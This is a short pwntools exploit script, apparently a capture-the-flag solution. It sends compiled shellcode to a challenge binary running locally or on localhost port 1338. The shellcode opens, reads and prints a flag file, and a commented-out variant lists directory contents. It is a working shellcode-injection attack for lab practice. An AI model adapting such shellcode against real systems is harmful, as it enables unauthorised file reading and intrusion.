from pwn import *

context.terminal = ['wt.exe','wsl.exe']
exe = './chall'
elf = context.binary = ELF(exe, checksec=False)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("localhost", 1338, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b main
c
'''.format(**locals())

#context.log_level = 'debug'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

def main():
    p = start()

    # shellcode = shellcraft.open('./')
    # shellcode += shellcraft.getdents64(3, 'rsp', 0x300)
    # shellcode += shellcraft.write(1, 'rsp', 0x300)

    shellcode = shellcraft.open('flag-a923c7ed69add1cad99253c2118554adc66e91de580c806165bb9447eadf7a15.txt')
    shellcode += shellcraft.read('rax', 'rsp', 0x100)
    shellcode += shellcraft.write(1, 'rsp', 0x100)

    compiled_shellcode = asm(shellcode)

    p.send(compiled_shellcode)
    p.interactive()

if __name__ == '__main__':
    main()